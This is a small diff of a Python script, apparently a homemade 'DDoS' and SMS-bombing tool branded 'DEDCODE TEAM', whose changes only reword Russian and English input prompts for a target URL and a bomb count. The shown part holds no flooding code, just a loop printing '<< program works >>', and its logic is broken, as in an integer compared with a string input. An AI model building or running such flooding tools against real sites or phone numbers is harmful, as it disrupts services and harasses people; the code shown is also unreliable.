@@ -28,15 +28,15 @@ os.system("clear")
 
 print('''🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼''')
 print("\n ")
-print("what do you want: \nddos - 1)")
+print("what do you want ddos")
 
-inp = input("Ссылку >>> ")
+inp = input("Количество bomb) >>> ")
 
 if inp == 1:
     smsbomb()
 
 def dos():
- url = input("url >>> ")
+ url = input("Ссылка url >>> ")
  os.system('cls||clear')
  while True:
   print("<< program works >>")
